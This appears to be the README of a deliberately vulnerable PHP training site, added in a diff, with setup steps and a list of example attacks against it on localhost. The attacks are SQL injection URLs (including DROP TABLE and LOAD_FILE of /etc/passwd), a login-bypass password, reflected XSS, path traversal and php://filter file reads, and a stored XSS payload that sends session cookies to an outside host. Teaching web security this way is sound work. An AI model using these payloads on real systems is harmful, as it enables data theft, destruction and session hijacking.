@@ -1,0 +1,46 @@
+
+
+
+How to install this example:
+------
+Firstly -> install xampp or wampp/lampp
+
+1. Load the db.sql file to your database.
+2. Change the consts.php file to contain the username and password of database user.
+3. Load your site.
+
+Examples:
+---------
+
+SQL Injection:
+--------------
+http://localhost/very-bad-site?username=mircea'%20or%20'1'='1
+http://localhost/very-bad-site?username=mircea'%20or%20''='
+http://localhost/very-bad-siteindex.php?id=1%20or%201=1
+http://localhost/very-bad-site?id=1;drop%20table%20invoices -- doesn't work because mysql_query stacked query support -- but will work with other dbs
+http://localhost/very-bad-site/index.php?username='%20UNION%20SELECT%201,1,1,1,LOAD_FILE('/etc/passwd'),'1
+http://localhost/very-bad-site/index.php?username='%20UNION%20SELECT%201,2,3,4,5,'hello%20world
+
+
+Bypass Login:
+
+Password: foo' or '1'='1
+
+XSS:
+----
+http://localhost/very-bad-site/index.php?username=mircea%3Cscript%3Ealert('Hi%20there!')%3C/script%3E
+http://localhost/very-bad-site/template?load=php://filter/convert.base64-encode/resource=loadme
+
+Use XSS to hijack a users session:
+----------------------------------
+On the 'Send message' page:
+
+Hey just wanted to say that you guys rock!
+<script>
+new Image().src="http://somereallybadsite.tld/?c="+encodeURI(document.cookie);
+</script>
+
+XSS to read files on disk:
+--------------------------
+http://localhost/template.php?load=../../../../etc/passwd%00
+
